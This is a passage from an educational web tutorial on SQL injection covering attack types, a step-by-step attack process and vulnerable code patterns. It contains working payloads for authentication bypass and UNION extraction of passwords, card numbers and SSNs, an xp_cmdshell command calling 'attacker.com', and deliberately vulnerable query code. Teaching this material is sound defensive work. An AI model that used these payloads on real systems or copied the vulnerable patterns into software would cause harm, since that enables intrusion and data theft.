class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80fd-81c0-e7989b23a240"><strong>Case Study 3: Time-Based Blind SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80bb-9d17-f864ff5660d2"><strong>Advanced Mitigations</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80e1-87af-d9e9b055371b"><strong>Defense in Depth Strategy</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-804f-9cf2-f1680f76c1a7"><strong>Query Timeouts</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8050-8f87-c075f9f29ecc"><strong>Input Sanitization (Secondary Defense)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8011-b859-c3ec7ec3a9ce"><strong>SAST/DAST Detection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8029-8e00-e50a3eee9018"><strong>SAST (Static Application Security Testing)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8065-8821-c3caa79619d4"><strong>DAST (Dynamic Application Security Testing)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-802a-9335-d272ec17a4d4"><strong>Risk Assessment</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8047-b882-ca688d134ac2"><strong>Risk Matrix</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80bf-b600-d25e5f4f4e5b"><strong>Risk Calculation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8006-be84-ca3f289959c7"><strong>Risk Prioritization</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8085-a2bb-e45e800a7ef3"><strong>Summary</strong></a></div></nav></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8028-9993-ebc50619fbcf" class=""><strong>Introduction</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8061-9e41-c4593cd3bf43" class="">SQL Injection (SQLi) is one of the most critical and prevalent web application vulnerabilities. It ranks #3 in the OWASP Top 10 2021 and has been a persistent threat since the early days of web applications.</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8012-b329-c1d804229b8f" class=""><strong>What SQL Injection is Used For</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8096-82a7-e5997884dc16" class="">SQL Injection attacks are used by attackers to:</p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8016-9536-ea8ee3115873" class="bulleted-list"><li style="list-style-type:disc"><strong>Bypass authentication</strong> mechanisms</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801a-bf92-da7e0740a2df" class="bulleted-list"><li style="list-style-type:disc"><strong>Extract sensitive data</strong> from databases</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809b-90e9-feaa727bb78d" class="bulleted-list"><li style="list-style-type:disc"><strong>Modify or delete data</strong> in databases</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8017-9825-efec8297a3f1" class="bulleted-list"><li style="list-style-type:disc"><strong>Execute arbitrary commands</strong> on database servers</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d3-8d11-e8ed02331189" class="bulleted-list"><li style="list-style-type:disc"><strong>Perform privilege escalation</strong></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8037-8173-d718c5498352" class="bulleted-list"><li style="list-style-type:disc"><strong>Access internal network resources</strong> (in some cases)</li></ul></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8040-9daa-f64b7a3c8de3" class=""><strong>Why SQL Injection is Dangerous</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80bf-bcd3-e5f938bd8f32" class=""><strong>Severity:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-806a-91f1-eea543057da3" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>High Impact</strong>: Can lead to complete database compromise</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8095-85aa-fbe2c7164531" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Common</strong>: Found in many applications</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8082-b7b3-ea410d114157" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Easy to Exploit</strong>: Basic attacks require minimal technical skill</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-800f-825d-fee45645fa4b" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Hard to Detect</strong>: May not show obvious errors</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8009-9abd-ca77ffe0e518" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Persistent</strong>: Still prevalent despite awareness</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80b3-acb4-c5dd27707b3e"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8041-9b5d-e06390bfb98a" class=""><strong>What is SQL Injection</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8028-990b-e3f27f78bebd" class="">SQL Injection is a code injection technique that exploits security vulnerabilities in an application&#x27;s database layer. It occurs when user-supplied input is not properly validated, sanitized, or parameterized before being used in SQL queries.</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8039-8414-c6dc4f3dd219" class=""><strong>Basic Example</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80dd-ab66-e6235f3a5796" class=""><strong>Vulnerable Code:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-807e-b8a6-ed71103c414d" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">username = request.form[&#x27;username&#x27;]
+password = request.form[&#x27;password&#x27;]
+
+query = f&quot;SELECT * FROM users WHERE username = &#x27;{username}&#x27; AND password = &#x27;{password}&#x27;&quot;
+result = db.execute(query)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d3-a557-c4400300e757" class=""><strong>Attack:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80a3-8dd9-ec2d4f7751f7" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Username: admin&#x27;--
+Password: (anything)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b9-86ed-fee2b169a471" class=""><strong>Resulting Query:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-807a-9c2f-ef87d1419949" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">SELECT * FROM users WHERE username = &#x27;admin&#x27;--&#x27; AND password = &#x27;&#x27;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-809e-becd-d20aed1e7e06" class="">The <code>--</code> comments out the password check, allowing login without a password!</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80bf-8e7c-c9e457f5b084"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-806d-a1df-ff5231c15c74" class=""><strong>Types of SQL Injection</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-807f-8b03-effc45458de5" class=""><strong>1. Classic/In-Band SQL Injection</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8014-80c4-faf59b5ccad0" class=""><strong>Description:</strong> The attacker receives the results directly in the application&#x27;s response.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-801f-a712-fb7aef880838" class=""><strong>Subtypes:</strong></p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80e5-8789-d841949a0f75" class=""><strong>a) Error-Based SQL Injection</strong></h3></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807b-9474-ec06aa0c2ead" class="bulleted-list"><li style="list-style-type:disc">Exploits database error messages</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8027-8b53-fbddd4123e06" class="bulleted-list"><li style="list-style-type:disc">Errors reveal database structure</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8056-a0e2-f2bd797d193b" class="bulleted-list"><li style="list-style-type:disc">Example: <code>&#x27; OR 1=1--</code></li></ul></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80e9-801c-cad0ee599c76" class=""><strong>b) Union-Based SQL Injection</strong></h3></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e0-9f2b-d629f1cece7a" class="bulleted-list"><li style="list-style-type:disc">Uses <code>UNION</code> to combine queries</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8032-ae05-e9695756d9da" class="bulleted-list"><li style="list-style-type:disc">Extracts data from other tables</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-803d-907d-e29e219840ac" class="bulleted-list"><li style="list-style-type:disc">Example: <code>&#x27; UNION SELECT username, password FROM users--</code></li></ul></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-808d-a940-e9911c953ea6" class=""><strong>2. Blind SQL Injection</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d1-a046-c5a4643db901" class=""><strong>Description:</strong> The attacker doesn&#x27;t see direct results but infers information from application behavior.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f3-97b3-d379d9d055d7" class=""><strong>Subtypes:</strong></p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8034-8e2f-c3cd38133af9" class=""><strong>a) Boolean-Based Blind</strong></h3></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a1-8932-f1a8967e9957" class="bulleted-list"><li style="list-style-type:disc">Uses true/false conditions</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e0-a37b-c3ceb5cb2442" class="bulleted-list"><li style="list-style-type:disc">Observes different responses</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80cb-b25f-c1c89d148041" class="bulleted-list"><li style="list-style-type:disc">Example: <code>&#x27; AND 1=1--</code> vs <code>&#x27; AND 1=2--</code></li></ul></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8080-8598-f3b26e4ac3a2" class=""><strong>b) Time-Based Blind</strong></h3></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f9-bc79-e29fa872170e" class="bulleted-list"><li style="list-style-type:disc">Uses time delays to infer data</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8039-b0f9-ebc5a333b8ec" class="bulleted-list"><li style="list-style-type:disc">Example: <code>&#x27;; WAITFOR DELAY &#x27;00:00:05&#x27;--</code></li></ul></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-806f-b414-f91540218138" class=""><strong>3. Second-Order SQL Injection</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803d-820e-dd00313e9d94" class=""><strong>Description:</strong> Malicious input is stored and executed later when used in another query.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d2-aa9a-ffe48d976ab2" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8004-b194-fa29de2ee909" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># First query (stored)
+username = &quot;admin&#x27;--&quot;
+db.execute(f&quot;INSERT INTO users (username) VALUES (&#x27;{username}&#x27;)&quot;)
+
+# Second query (executed later)
+user = db.execute(f&quot;SELECT * FROM users WHERE username = &#x27;{username}&#x27;&quot;)
+# Executes: SELECT * FROM users WHERE username = &#x27;admin&#x27;--&#x27;
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8017-9ee8-c92288f67e25" class=""><strong>4. Out-of-Band SQL Injection</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8053-b091-cb8d5d2327c6" class=""><strong>Description:</strong> Uses alternative channels (DNS, HTTP) to extract data.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-809a-a6e5-e74c21214409" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80c2-ba3e-d4f18678928d" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">&#x27;; EXEC xp_cmdshell(&#x27;nslookup attacker.com&#x27;)--
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80be-bd2e-ec3f56bedc15"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8046-918c-e296327db5cf" class=""><strong>How SQL Injection Works</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8060-8281-e77d80784e93" class=""><strong>Step-by-Step Attack Process</strong></h3></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8034-aa19-e682c075299a" class="numbered-list" start="1"><li><strong>Identify Input Points:</strong><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80dd-b5a2-dddaac5e7909" class="bulleted-list"><li style="list-style-type:disc">URL parameters</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8071-bb6e-caa7397b7e12" class="bulleted-list"><li style="list-style-type:disc">Form fields</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8011-8263-f1127b9efc2d" class="bulleted-list"><li style="list-style-type:disc">HTTP headers</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d8-ba83-e91e8873e9f8" class="bulleted-list"><li style="list-style-type:disc">Cookies</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8030-9133-e76a748f860f" class="numbered-list" start="2"><li><strong>Test for Vulnerability:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8072-9b02-c98ea9fed75a" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Test basic injection
+&#x27; OR &#x27;1&#x27;=&#x27;1
+
+-- Test for errors
+&#x27;
+
+-- Test for blind injection
+&#x27; AND 1=1--
+&#x27; AND 1=2--
+</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-80a3-bcf7-edf480eb6d46" class="numbered-list" start="3"><li><strong>Determine Database Type:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-804f-b3fd-cd80eea3f788" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- MySQL
+SELECT @@version
+
+-- MSSQL
+SELECT @@version
+
+-- PostgreSQL
+SELECT version()
+</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8004-90d6-c1ebf9b83ae6" class="numbered-list" start="4"><li><strong>Extract Database Schema:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-801f-a54a-f44b2c601501" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- MySQL
+SELECT table_name FROM information_schema.tables
+
+-- MSSQL
+SELECT name FROM sysobjects WHERE xtype=&#x27;U&#x27;
+</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8021-bdb8-f66357082507" class="numbered-list" start="5"><li><strong>Extract Data:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8068-804c-dc6df4f34466" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">UNION SELECT username, password FROM users--
+</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80d5-9be2-e63c14d20d45" class=""><strong>Vulnerable Code Patterns</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-802a-90d9-f78913c62bdf" class=""><strong>Pattern 1: String Concatenation</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80fd-b6ad-c034530ab300" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># ❌ VULNERABLE
+query = &quot;SELECT * FROM users WHERE username = &#x27;&quot; + username + &quot;&#x27;&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-802f-88b2-d91678cec6a9" class=""><strong>Pattern 2: String Formatting</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80dd-9b2e-c6efecdc66d0" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># ❌ VULNERABLE
+query = f&quot;SELECT * FROM users WHERE username = &#x27;{username}&#x27;&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8096-9a83-d6f7d7208317" class=""><strong>Pattern 3: Template Literals</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80f3-b523-fe48116945bb" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ❌ VULNERABLE
+const query = `SELECT * FROM users WHERE username = &#x27;${username}&#x27;`
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8053-adbf-cb6ab730c163" class=""><strong>Pattern 4: Dynamic Query Building</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80bb-beaf-da226d2f929f" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># ❌ VULNERABLE
+query = &quot;SELECT * FROM users WHERE 1=1&quot;
+if username:
+    query += f&quot; AND username = &#x27;{username}&#x27;&quot;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8092-8a5c-c4425f55e9e4"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80e7-bf69-d0907744dafb" class=""><strong>Impact of SQL Injection</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8072-9cd4-ffffcfe7df7e" class=""><strong>1. Data Breach</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d9-be23-ff1a9fd210b3" class=""><strong>Confidentiality Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-803f-9366-f08f4fe1d66c" class="bulleted-list"><li style="list-style-type:disc">Extract all user data</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-803d-a17b-e06d00465095" class="bulleted-list"><li style="list-style-type:disc">Access sensitive information</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805a-8f25-e4c5a6f95151" class="bulleted-list"><li style="list-style-type:disc">Read configuration files</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8064-9cc8-d7ecc2eaf3b3" class="bulleted-list"><li style="list-style-type:disc">Access encrypted data</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-809f-8bd4-cb52b110bd3a" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8088-b33f-c189e196b0d0" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">&#x27; UNION SELECT credit_card, ssn FROM customers--
